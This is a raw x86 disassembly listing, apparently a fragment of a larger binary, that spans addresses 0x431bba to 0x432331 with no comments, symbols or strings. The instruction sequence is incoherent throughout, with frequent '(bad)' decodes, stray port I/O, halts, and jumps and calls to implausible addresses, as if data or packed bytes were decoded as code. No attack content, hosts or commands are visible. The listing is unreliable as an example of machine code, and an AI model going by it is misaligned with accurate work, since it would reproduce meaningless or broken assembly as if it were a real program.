  431bba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431bbe:	fimul  WORD PTR [eax]
  431bc0:	fist   WORD PTR [ebp+0x1c]
  431bc3:	in     al,dx
  431bc4:	jne    0x431bb2
  431bc6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bcc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bd0:	fdivp  st(0),st
  431bd2:	fild   WORD PTR [ebp+0x4510f85c]
  431bd8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bde:	inc    ebp
  431bdf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431be5:	mov    ebp,DWORD PTR [ebx-0x4]
  431be8:	adc    al,0x8b
  431bea:	rcl    DWORD PTR [eax],0x48
  431bed:	mov    esi,0x7080803
  431bf2:	fiadd  WORD PTR [ebp+0x4d]
  431bf5:	(bad)  
  431bf6:	mov    edx,DWORD PTR [edx-0x4]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c02:	mov    DWORD PTR [edi+0x872dc],edi
  431c08:	xlat   BYTE PTR ds:[ebx]
  431c09:	into   
  431c0a:	ffreep st(6)
  431c0c:	retf   0x6c7
  431c0f:	iret   
  431c10:	dec    ebp
  431c11:	inc    ebp
  431c12:	mov    DWORD PTR [ebx],edi
  431c14:	fmul   QWORD PTR [edi]
  431c16:	dec    ebp
  431c17:	jnp    0x431c4c
  431c19:	add    BYTE PTR [ebx],al
  431c1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c1e:	inc    ebp
  431c1f:	dec    ebp
  431c20:	lea    esi,[ebx]
  431c22:	add    DWORD PTR [ebx],eax
  431c24:	jb     0x431c61
  431c26:	add    BYTE PTR [edi],cl
  431c28:	inc    ebp
  431c29:	imul   eax,edi,0x858bd800
  431c2f:	cld    
  431c30:	clc    
  431c31:	mov    DWORD PTR [ebp+0x0],eax
  431c34:	inc    DWORD PTR [eax]
  431c36:	or     al,0xde
  431c38:	sbb    bh,0x1
  431c3b:	retf   
  431c3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c43:	dec    ebp
  431c44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c4a:	enter  0x12de,0xdf
  431c4e:	inc    ebp
  431c4f:	pop    ebp
  431c50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c56:	add    DWORD PTR [edx],edx
  431c58:	add    BYTE PTR [ebp+0x50],dl
  431c5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c67:	or     ah,al
  431c69:	pop    ss
  431c6a:	cdq    
  431c6b:	push   ebp
  431c6c:	clc    
  431c6d:	mov    eax,DWORD PTR [ebp-0x4]
  431c70:	xor    edx,edx
  431c72:	add    esi,DWORD PTR [ebx]
  431c74:	cmp    eax,DWORD PTR [ebx]
  431c76:	hlt    
  431c77:	cmp    DWORD PTR [ebx],esp
  431c79:	or     al,BYTE PTR [ebp+0xf]
  431c7c:	mov    eax,DWORD PTR [edx]
  431c7e:	loopne 0x431c80
  431c80:	(bad)  
  431c81:	mov    ecx,esi
  431c83:	cld    
  431c84:	pushf  
  431c85:	pop    ebp
  431c86:	fwait
  431c87:	mov    esi,DWORD PTR [edx]
  431c89:	lock mov eax,eax
  431c8c:	adc    BYTE PTR [ebx],al
  431c8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c9b:	dec    ebp
  431c9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ca2:	(bad)  
  431ca3:	iret   
  431ca4:	inc    ebp
  431ca5:	(bad)  
  431ca6:	jne    0x431cf5
  431ca8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431cae:	(bad)  
  431caf:	cmp    ebx,eax
  431cb1:	je     0x431c39
  431cb3:	add    edi,edi
  431cb5:	or     bh,bh
  431cb7:	dec    ebp
  431cb8:	inc    ebp
  431cb9:	mov    esi,DWORD PTR [ebx]
  431cbb:	cld    
  431cbc:	add    ecx,esi
  431cbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431cc1:	mov    edx,DWORD PTR [edi]
  431cc3:	or     BYTE PTR [ebp-0x7c],al
  431cc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431ccc:	test   BYTE PTR [ebx+ebx*4],cl
  431ccf:	inc    ebp
  431cd0:	xor    bh,BYTE PTR [esi]
  431cd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cd9:	jne    0x431ca2
  431cdb:	mov    ebp,esp
  431cdd:	fcomp  DWORD PTR [ebx]
  431cdf:	add    BYTE PTR [ecx],al
  431ce1:	inc    DWORD PTR [ebp-0x75]
  431ce4:	(bad)  
  431ce5:	cld    
  431ce6:	add    al,0xce
  431ce8:	mov    ecx,edi
  431cea:	cld    
  431ceb:	inc    ebp
  431cec:	fidivr WORD PTR [ebx]
  431cee:	fbstp  TBYTE PTR [ebp-0x3e]
  431cf1:	mov    eax,DWORD PTR [eax]
  431cf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431cf9:	fadd   st,st(7)
  431cfb:	add    BYTE PTR [ebp-0x1],al
  431cfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431d01:	inc    ebp
  431d02:	mov    bh,0xc7
  431d05:	loopne 0x431d4c
  431d07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d0d:	sbb    dh,BYTE PTR [ebx]
  431d0f:	pushf  
  431d10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d16:	mov    eax,edi
  431d18:	cwde   
  431d19:	inc    ebp
  431d1a:	inc    ebp
  431d1b:	jne    0x431ca8
  431d1d:	mov    esp,esp
  431d1f:	clc    
  431d20:	add    al,0x4d
  431d22:	mov    DWORD PTR [ebx],esi
  431d24:	or     al,0x33
  431d26:	inc    ebp
  431d27:	lea    ecx,[ebx-0x398d13fd]
  431d2d:	add    bh,al
  431d2f:	inc    ebp
  431d30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d37:	add    ebp,esp
  431d39:	shufps xmm1,xmm3,0xc7
  431d3d:	(bad)  
  431d3e:	jmp    0x74885867
  431d43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d49:	hlt    
  431d4a:	mov    ecx,DWORD PTR [edi]
  431d4c:	fadd   DWORD PTR [ebp+0x0]
  431d4f:	xor    ecx,DWORD PTR [edi]
  431d51:	add    ecx,ecx
  431d53:	cmp    edi,edi
  431d55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d59:	(bad)  
  431d5a:	jmp    0x431ce7
  431d5c:	mov    edi,esp
  431d5e:	or     al,0xc6
  431d60:	inc    ebp
  431d61:	(bad)  
  431d62:	mov    eax,DWORD PTR [ebp+0x10]
  431d65:	jne    0x431cf0
  431d67:	mov    eax,DWORD PTR [ecx]
  431d69:	clc    
  431d6a:	add    BYTE PTR [ebp-0x40],cl
  431d6d:	xor    edx,DWORD PTR [eax-0x73]
  431d70:	jne    0x431d73
  431d72:	push   DWORD PTR [edx+0x8]
  431d75:	add    BYTE PTR [ebp+0x45],al
  431d78:	mov    ebp,ecx
  431d7a:	cld    
  431d7b:	add    BYTE PTR [ebp+0x0],cl
  431d7e:	xor    eax,DWORD PTR [ebp+0x3]
  431d81:	mov    DWORD PTR [ebx],edi
  431d83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d89:	sub    eax,0x5d330e4d
  431d8e:	lea    esi,[ebx]
  431d90:	add    DWORD PTR [ebx],eax
  431d92:	jb     0x431d7d
  431d94:	add    BYTE PTR [eax],al
  431d96:	inc    ebp
  431d97:	add    bl,ch
  431d99:	inc    ebp
  431d9a:	mov    esi,DWORD PTR [ebx]
  431d9c:	or     al,0x3
  431d9e:	(bad)  
  431d9f:	mov    edi,eax
  431da1:	in     al,dx
  431da2:	scas   eax,DWORD PTR es:[edi]
  431da3:	inc    ebp
  431da4:	mov    esi,DWORD PTR [ebx]
  431da6:	in     al,0x3
  431da8:	add    al,0x89
  431daa:	mov    ecx,DWORD PTR [eax+edi*8]
  431dad:	dec    ebp
  431dae:	(bad)  
  431daf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431db6:	mov    ecx,eax
  431db8:	cld    
  431db9:	push   es
  431dba:	dec    ebp
  431dbb:	add    al,0x33
  431dbd:	mov    DWORD PTR [ebx],eax
  431dbf:	in     al,dx
  431dc0:	cmp    DWORD PTR [ebp-0x67],eax
  431dc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431dc9:	mov    edx,DWORD PTR [ebp-0x4]
  431dcc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dcf:	xor    eax,DWORD PTR [ebp+0x3]
  431dd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431dd8:	xor    edi,esp
  431dda:	jmp    0xff771b2c
  431ddf:	add    ecx,DWORD PTR [ebp-0x3f]
  431de2:	xor    ebx,DWORD PTR [edi]
  431de4:	add    eax,ecx
  431de6:	cmp    ebx,DWORD PTR [eax]
  431de8:	mov    ecx,DWORD PTR [ebp-0x4]
  431deb:	mov    ecx,DWORD PTR [eax]
  431ded:	adc    BYTE PTR [ebp-0x80],al
  431df0:	jmp    0x431df3
  431df2:	mov    eax,DWORD PTR [eax]
  431df4:	cld    
  431df5:	mov    bh,0xc6
  431df7:	push   ecx
  431df8:	(bad)  
  431df9:	jne    0x431e59
  431dfb:	dec    ecx
  431dfd:	or     BYTE PTR [ecx+ebx*1],cl
  431e00:	push   ebp
  431e01:	inc    ebp
  431e02:	in     al,dx
  431e03:	add    ebp,esp
  431e05:	or     bh,al
  431e07:	dec    ebp
  431e08:	cld    
  431e09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e0f:	xor    DWORD PTR [edx],0x2
  431e12:	pushf  
  431e13:	dec    DWORD PTR [ebx+0x45510cf4]
  431e19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e1f:	mov    edx,DWORD PTR [ecx+0xc]
  431e22:	xor    eax,esi
  431e24:	mov    edx,0xc172c7
  431e29:	inc    ebp
  431e2a:	mov    esi,DWORD PTR [ebp+0x8]
  431e2d:	mov    eax,edx
  431e2f:	call   0x84c7e524
  431e34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e3a:	mov    ebp,eax
  431e3c:	or     BYTE PTR [eax],dl
  431e3e:	jo     0x431e8d
  431e40:	push   edi
  431e41:	xor    esi,DWORD PTR [ebp+0x3]
  431e44:	(bad)  
  431e45:	pmulhuw mm0,mm1
  431e48:	test   DWORD PTR [ebp-0x8],ecx
  431e4b:	mov    DWORD PTR [ebp-0x67],eax
  431e4e:	mov    eax,DWORD PTR [ebp-0x4]
  431e51:	xor    edi,DWORD PTR [ebp-0x73]
  431e54:	xor    eax,DWORD PTR [ebx]
  431e56:	xor    esi,DWORD PTR [edx+0x3]
  431e59:	add    BYTE PTR [ecx],bh
  431e5b:	inc    ebp
  431e5c:	(bad)  
  431e5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e63:	mov    DWORD PTR [eax],0x750f0004
  431e69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e6f:	lock add BYTE PTR [ebp+0x0],cl
  431e73:	mov    esi,DWORD PTR [ebp-0x18]
  431e76:	mov    ebp,edx
  431e78:	or     al,0x72
  431e7a:	ja     0x431e7c
  431e7c:	mov    edx,esi
  431e7e:	cld    
  431e7f:	(bad)  
  431e82:	cli    
  431e83:	mov    esi,DWORD PTR [ebp-0x4]
  431e86:	cmp    ecx,esi
  431e88:	bswap  edi
  431e8a:	(bad)
  431e8e:	mov    esi,DWORD PTR [ebp-0x4]
  431e91:	mov    esi,ecx
  431e93:	clc    
  431e94:	repnz add esi,DWORD PTR [ebp+0x45]
  431e98:	push   ebx
  431e99:	xor    eax,DWORD PTR [ebp+0x3]
  431e9c:	cmp    al,0x5f
  431e9e:	pushf  
  431e9f:	pop    ebx
  431ea0:	jmp    0x431f67
  431ea5:	mov    esi,DWORD PTR [ebp-0x7d]
  431ea8:	xor    ebp,DWORD PTR [eax]
  431eaa:	lea    eax,[ebp-0x8]
  431ead:	xor    edx,esi
  431eaf:	pushf  
  431eb0:	out    dx,eax
  431eb1:	(bad)  
  431eb2:	neg    eax
  431eb4:	ins    DWORD PTR es:[edi],dx
  431eb5:	test   esi,edi
  431eb7:	clc    
  431eb8:	pop    esp
  431eb9:	inc    ebp
  431eba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431ec0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431ec6:	add    cl,al
  431ec8:	jne    0x431e65
  431eca:	mov    esi,DWORD PTR [edx]
  431ecc:	in     al,dx
  431ecd:	push   esi
  431ece:	xor    BYTE PTR [ebp-0xe],dh
  431ed1:	add    edi,esi
  431ed3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ed9:	add    cl,bh
  431edb:	mov    edi,DWORD PTR [ebp+0x8]
  431ede:	mov    DWORD PTR [ebp-0x14],esi
  431ee1:	add    esi,DWORD PTR [ebp+0x3c]
  431ee4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431eea:	mov    ah,0x3e
  431eec:	fwait
  431eed:	pushf  
  431eee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ef4:	jne    0x431e81
  431ef6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ef9:	icebp  
  431efa:	icebp  
  431efb:	shl    edx,0xf2
  431efe:	(bad)  
  431eff:	mov    ah,0x16
  431f01:	push   eax
  431f02:	jne    0x431e97
  431f04:	mov    ecx,DWORD PTR [edi]
  431f06:	in     al,dx
  431f07:	jmp    0x431efa
  431f09:	add    dl,dh
  431f0b:	mov    edi,esi
  431f0d:	or     al,0x8
  431f0f:	inc    ebp
  431f10:	jne    0x431f15
  431f12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f18:	ret    
  431f19:	or     bh,bh
  431f1b:	jge    0x431f05
  431f1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f23:	xor    edi,eax
  431f25:	add    esi,DWORD PTR [ebp-0x77]
  431f28:	mov    ebx,esp
  431f2a:	clc    
  431f2b:	neg    DWORD PTR [ebp-0x7c]
  431f2e:	xor    eax,DWORD PTR [eax]
  431f30:	cmp    eax,DWORD PTR [eax]
  431f32:	repz jne 0x431eca
  431f35:	xor    eax,DWORD PTR [ecx]
  431f37:	add    ebx,DWORD PTR [eax]
  431f39:	mov    DWORD PTR [ebp-0x8],eax
  431f3c:	mov    eax,edi
  431f3e:	cld    
  431f3f:	lock pop eax
  431f41:	test   DWORD PTR [ebx],esi
  431f43:	clc    
  431f44:	add    edx,DWORD PTR [edi-0x740bff77]
  431f4a:	fdivp  st(4),st
  431f4c:	test   ecx,esi
  431f4e:	(bad)  
  431f4f:	jnp    0x431f50
  431f51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f57:	jae    0x431ee4
  431f59:	sub    edi,esp
  431f5b:	(bad)  
  431f5c:	shl    DWORD PTR [eax-0x3e],0x89
  431f60:	leave  
  431f61:	call   0x8198d66e
  431f66:	in     al,dx
  431f67:	(bad)  
  431f68:	in     al,dx
  431f69:	add    bh,al
  431f6b:	mov    esp,edi
  431f6d:	in     al,dx
  431f6e:	test   DWORD PTR [ebp-0x8],edi
  431f71:	mov    eax,DWORD PTR [ebp+0x2b]
  431f74:	xor    al,BYTE PTR [ebx]
  431f76:	pushf  
  431f77:	jnp    0x57321bb0
  431f7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f81:	loopne 0x431fb6
  431f83:	jne    0x431f40
  431f85:	mov    esi,DWORD PTR [edx-0x20]
  431f88:	add    BYTE PTR [ebp-0x3d],bh
  431f8b:	xor    eax,DWORD PTR [ebp-0x73]
  431f8e:	mov    edi,DWORD PTR [esi]
  431f90:	cld    
  431f91:	jb     0x431f59
  431f93:	add    bl,al
  431f95:	jne    0x431fdc
  431f97:	mov    edx,DWORD PTR [edi-0x10]
  431f9a:	jge    0x432019
  431f9c:	mov    esi,DWORD PTR [ebx]
  431f9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431fa2:	xor    esi,DWORD PTR [ebp-0x77]
  431fa5:	mov    esi,eax
  431fa7:	lock inc ebp
  431fa9:	jge    0x431fdc
  431fab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431fb2:	dec    ebp
  431fb3:	mov    esi,DWORD PTR [ebx]
  431fb5:	loopne 0x431f40
  431fb7:	jge    0x431fb1
  431fb9:	add    DWORD PTR [ebp-0x7d],eax
  431fbc:	icebp  
  431fbd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fc4:	dec    ebp
  431fc5:	hlt    
  431fc6:	xor    ebx,DWORD PTR [ebp-0x77]
  431fc9:	mov    esi,esp
  431fcb:	in     al,0x45
  431fcd:	jge    0x43200c
  431fcf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fd6:	dec    ebp
  431fd7:	push   esp
  431fd8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fde:	inc    ebp
  431fdf:	hlt    
  431fe0:	xor    DWORD PTR [ebp-0x61],esi
  431fe3:	mov    edi,DWORD PTR [eax+0xf19504]
  431fe9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ff0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ff4:	fistp  WORD PTR [ebx+0x0]
  431ff7:	inc    ebp
  431ff8:	mov    ebx,DWORD PTR [edi+0xc]
  431ffb:	add    eax,eax
  431ffd:	inc    ebp
  431ffe:	test   BYTE PTR [ebx],dh
  432000:	add    eax,DWORD PTR [ebx]
  432002:	add    BYTE PTR [esi+0x45],bl
  432005:	ret    0x85
  432008:	jnp    0x5443a3d7
  43200e:	inc    bp
  432010:	inc    ebp
  432011:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432017:	fdiv   QWORD PTR [ebx]
  432019:	test   DWORD PTR [ecx+0x453bf8],edi
  43201f:	push   ebx
  432020:	add    edi,DWORD PTR [esi+0x708088b]
  432026:	cmp    esi,eax
  432028:	setnp  BYTE PTR [ecx-0x74fcffce]
  43202f:	mov    esp,edi
  432031:	call   0x33ce6583
  432036:	or     BYTE PTR [ebx],al
  432038:	inc    ecx
  432039:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43203f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432045:	lock add cl,al
  432048:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43204f:	mov    ch,0x45
  432051:	clc    
  432052:	xor    eax,DWORD PTR [ebp+0x3]
  432055:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43205b:	inc    ebp
  43205c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432062:	mov    edi,eax
  432064:	mov    eax,DWORD PTR [ebp+0x3c]
  432067:	mov    ecx,DWORD PTR [eax]
  432069:	hlt    
  43206a:	inc    ebp
  43206b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432072:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432078:	push   ebp
  432079:	mov    edi,DWORD PTR [ebx]
  43207b:	in     al,dx
  43207c:	jne    0x43203f
  43207e:	mov    eax,DWORD PTR [ebp-0x28]
  432081:	add    DWORD PTR [eax],0xe8058dec
  432087:	clc    
  432088:	mov    esi,DWORD PTR [edi-0x8]
  43208b:	add    dh,dl
  43208d:	rol    WORD PTR [ebp-0x1],cl
  432091:	mov    edx,DWORD PTR [eax+0x8]
  432094:	jne    0x432056
  432096:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43209d:	inc    ebp
  43209e:	push   esp
  43209f:	test   DWORD PTR [ecx+0xf],ecx
  4320a2:	sub    edx,esp
  4320a4:	add    eax,DWORD PTR [eax]
  4320a6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4320ac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4320b3:	mov    eax,DWORD PTR [ecx]
  4320b5:	and    BYTE PTR [eax],al
  4320b7:	cmp    al,0x10
  4320b9:	add    BYTE PTR [ebp+0x66],al
  4320bc:	inc    ecx
  4320be:	push   esp
  4320bf:	add    dh,BYTE PTR [ebp+0x0]
  4320c2:	push   edx
  4320c3:	enterw 0xc1,0x4d
  4320c8:	mov    esp,DWORD PTR [esi+0x20]
  4320cb:	add    DWORD PTR [ecx-0x7b],eax
  4320ce:	add    eax,DWORD PTR [ebx]
  4320d0:	str    WORD PTR [eax+0x45]
  4320d4:	lea    ecx,[ebx+0x45890801]
  4320da:	sbb    BYTE PTR [ebx],al
  4320dc:	dec    ebp
  4320dd:	cmp    al,0xf
  4320df:	inc    ebp
  4320e0:	push   eax
  4320e1:	mov    esi,DWORD PTR [ebx]
  4320e3:	push   eax
  4320e4:	add    eax,eax
  4320e6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320ed:	inc    ebp
  4320ee:	add    BYTE PTR [ecx],dh
  4320f0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320f7:	(bad)  
  4320f8:	mov    ebx,eax
  4320fa:	loopne 0x432141
  4320fc:	dec    ebp
  4320fd:	mov    ecx,DWORD PTR [edi]
  4320ff:	cld    
  432100:	push   eax
  432101:	xchg   DWORD PTR [ebx],esi
  432103:	add    DWORD PTR [ebx],ebp
  432105:	add    BYTE PTR [ebx],ch
  432107:	or     BYTE PTR [ecx],bh
  432109:	dec    ecx
  43210a:	loopne 0x43210f
  43210c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432112:	push   ebp
  432113:	add    DWORD PTR [ebx+0x55100800],eax
  432119:	dec    ebp
  43211a:	jmp    0x4320a5
  43211c:	mov    esp,DWORD PTR [eax]
  43211e:	sbb    dl,dl
  432120:	inc    eax
  432121:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432127:	add    BYTE PTR [ebx+0x74528555],cl
  43212d:	push   ebp
  43212e:	div    DWORD PTR [ebx]
  432130:	and    eax,DWORD PTR [ebx]
  432132:	add    edx,DWORD PTR [edx-0x30]
  432135:	jno    0x4320c2
  432137:	inc    DWORD PTR [eax+eiz*1]
  43213a:	inc    ebp
  43213b:	push   eax
  43213c:	push   eax
  43213d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432143:	mov    edi,esp
  432145:	push   eax
  432146:	inc    ebp
  432147:	enter  0x458b,0x8
  43214b:	push   ecx
  43214c:	(bad)  
  43214d:	call   0x10d2b25
  432152:	pop    ss
  432153:	push   ebp
  432154:	mov    ecx,DWORD PTR [ebx+0x489408]
  43215a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432160:	push   ecx
  432161:	jo     0x43214b
  432163:	inc    DWORD PTR [edi]
  432165:	or     BYTE PTR [eax],al
  432167:	call   0xce28b1
  43216c:	fmul   QWORD PTR [ebp+0x55]
  43216f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432175:	mov    bh,0x8c
  432177:	adc    al,0x9b
  432179:	dec    esp
  43217a:	xor    bl,BYTE PTR [eax]
  43217c:	mov    ecx,DWORD PTR [ebp+0xc]
  43217f:	mov    eax,DWORD PTR [ebp-0x4]
  432182:	mov    esi,DWORD PTR [edi-0x3148f924]
  432188:	push   es
  432189:	retf   
  43218a:	mov    BYTE PTR [ebp-0x30],0x3b
  43218e:	inc    ebp
  43218f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432196:	retf   0x83fc
  432199:	into   
  43219a:	dec    ebp
  43219b:	retf   
  43219c:	mov    ecx,DWORD PTR [ebp-0x74]
  43219f:	mov    eax,DWORD PTR [eax]
  4321a1:	fdiv   QWORD PTR [ebx]
  4321a3:	mov    bh,0x3
  4321a5:	push   es
  4321a6:	mov    esi,ecx
  4321a8:	sbb    cl,dl
  4321aa:	dec    ebp
  4321ab:	sar    DWORD PTR [ebx],cl
  4321ad:	push   ebp
  4321ae:	jne    0x4321bf
  4321b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321b6:	lea    ebx,[eax]
  4321b8:	call   0xf4ccad7f
  4321bd:	sbb    dh,dl
  4321bf:	add    edx,ebx
  4321c1:	push   ebp
  4321c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321c8:	push   ecx
  4321c9:	mov    DWORD PTR [eax-0x30],edx
  4321cc:	test   DWORD PTR [edx],eax
  4321ce:	xadd   esp,esi
  4321d1:	pop    es
  4321d2:	add    cl,dl
  4321d4:	mov    eax,ecx
  4321d6:	or     al,0x45
  4321d8:	(bad)  
  4321d9:	push   eax
  4321da:	add    DWORD PTR [edx+0x0],eax
  4321dd:	add    ecx,DWORD PTR [ecx]
  4321df:	and    dh,cl
  4321e1:	call   0xc72ab1
  4321e6:	add    DWORD PTR [ebp+0x0],edx
  4321e9:	mov    esp,DWORD PTR [ebp+0x18]
  4321ec:	add    BYTE PTR [eax+0x50],cl
  4321ef:	xor    eax,DWORD PTR [eax]
  4321f1:	add    esp,DWORD PTR [esi+0x3b]
  4321f4:	inc    ebp
  4321f5:	je     0x43217a
  4321f7:	push   ecx
  4321f8:	dec    BYTE PTR [ebp-0x77]
  4321fb:	add    eax,esi
  4321fd:	or     al,0x5e
  4321ff:	inc    eax
  432200:	add    BYTE PTR [ebx],al
  432202:	data16 and BYTE PTR [ebp+0x50],al
  432206:	sub    DWORD PTR [ecx],0xfffffff8
  432209:	add    BYTE PTR [ebp-0x75],ah
  43220c:	add    BYTE PTR [eax],bl
  43220e:	enter  0x894d,0x8b
  432212:	int3   
  432213:	loopne 0x4321d7
  432215:	rol    BYTE PTR [eax],0x33
  432218:	lea    cx,[ebp+0xa]
  43221c:	data16 jb 0x432264
  43221f:	add    BYTE PTR [ebx+0x44890855],cl
  432225:	sbb    ah,al
  432227:	inc    ebp
  432228:	cmp    al,0xf
  43222a:	add    BYTE PTR [edx+0x66],dl
  43222d:	xor    ecx,DWORD PTR [eax]
  43222f:	sub    eax,DWORD PTR [edx]
  432231:	mov    eax,DWORD PTR [eax]
  432233:	or     al,0x66
  432235:	ror    edx,cl
  432237:	dec    ebp
  432238:	inc    ebp
  432239:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43223f:	cld    
  432240:	or     BYTE PTR [edi+0x4501dd],dl
  432246:	ret    0xecce
  432249:	retf   
  43224a:	(bad)  
  43224b:	dec    ebp
  43224c:	mov    al,0x8b
  43224e:	loopne 0x432270
  432250:	cmp    ecx,DWORD PTR [edx]
  432252:	inc    ebp
  432253:	daa    
  432254:	loopne 0x4321dd
  432256:	in     al,dx
  432257:	add    edi,eax
  432259:	add    BYTE PTR [eax+0x3f52e155],bh
  43225f:	push   ebp
  432260:	inc    ebp
  432261:	xor    ebx,edx
  432263:	add    ebp,esp
  432265:	push   edx
  432266:	push   bp
  432268:	inc    ebp
  432269:	(bad)  
  43226a:	in     eax,dx
  43226b:	push   esp
  43226c:	(bad)  
  43226d:	inc    edx
  43226f:	sbb    al,0x33
  432271:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432278:	add    BYTE PTR [ebp+0x46],0x8b
  43227c:	jmp    0xf98b:0x100041c8
  432283:	xor    esi,DWORD PTR [edx+0x3]
  432286:	mov    ecx,DWORD PTR [edi]
  432288:	fmul   DWORD PTR [edx]
  43228a:	add    BYTE PTR [eax],al
  43228c:	lea    eax,[ebx-0x4700273c]
  432292:	add    al,0x4f
  432294:	pop    DWORD PTR [eax]
  432296:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43229c:	push   edx
  43229d:	inc    WORD PTR [ebp+0x8]
  4322a1:	mov    eax,0x514f4d
  4322a6:	(bad)
  4322aa:	add    al,al
  4322ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4322b2:	test   DWORD PTR [esi+0x74],esp
  4322b5:	inc    ebp
  4322b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4322bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322c2:	or     dh,cl
  4322c4:	or     eax,0x8b8d5045
  4322c9:	inc    ebp
  4322ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4322d0:	jne    0x432305
  4322d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322d8:	add    DWORD PTR [ebx],eax
  4322da:	add    bh,bh
  4322dc:	adc    DWORD PTR [eax],ecx
  4322de:	adc    DWORD PTR [ebp+0x55],edi
  4322e1:	push   es
  4322e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322ef:	inc    ebp
  4322f0:	mov    esp,edi
  4322f2:	or     al,0xda
  4322f4:	push   eax
  4322f5:	(bad)  
  4322f6:	jne    0x4322ac
  4322f8:	call   0x3b1be7
  4322fd:	inc    ebp
  4322fe:	sar    BYTE PTR [eax],0x84
  432301:	in     al,dx
  432302:	add    bh,al
  432304:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43230b:	(bad)  
  43230c:	and    al,al
  43230e:	fs in  eax,dx
  432310:	inc    DWORD PTR [ebp-0x7b]
  432313:	jle    0x432324
  432315:	leave  
  432316:	scas   al,BYTE PTR es:[edi]
  432317:	inc    esp
  432318:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43231f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432326:	call   DWORD PTR [edi]
  432328:	shr    ah,0x84
  43232b:	xchg   DWORD PTR [eax],eax
  43232d:	add    DWORD PTR [eax],eax
  43232f:	add    bh,bh
  432331:	dec    ebp
